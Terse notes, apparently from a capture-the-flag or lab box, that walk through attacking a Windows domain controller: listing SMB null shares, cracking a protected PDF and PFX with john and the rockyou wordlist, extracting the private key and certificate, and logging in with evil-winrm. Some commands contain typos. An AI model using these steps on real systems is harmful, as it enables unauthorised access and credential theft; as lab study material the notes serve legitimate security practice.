services
LDAP -p 389
some domain controller (likely MS Active Directory) -p 53
kerberos-sec -p 88

`smbclient -L //<ip> -N`
null shares enabled
- Get a pword protected pdf inside

Cracking the password on pdf
`pdf2john <file>.pdf > john.hash`
`gzip -d /usr/share/wordlists/rockyou.txt.gz`
`john --wordlists=/usr/share/wordlists/rockyou.txt john.hash`

- pword protected pfx file inside (used for keys)
`pfx2john <file>.pfx > pfx.hash`
`john --wordlists=/usr/share/wordlists/rockyou.txt pfx.hash`
-> password to use pfx shud be spit out

`openSSL pkcs12 -in <file>.pfx -out privatekey.pem -nodes`
-> enter the cracked password for john
-> private key shud be received


Gain access to the system remotely
`cat privatekey.pem`
-> seperate out the private key and the cert

`evil-winrm -S -k legacy.key -c legacy.cert -i <targetip>`

`ls c:\Users\`
`net user john`
-> john has admin privs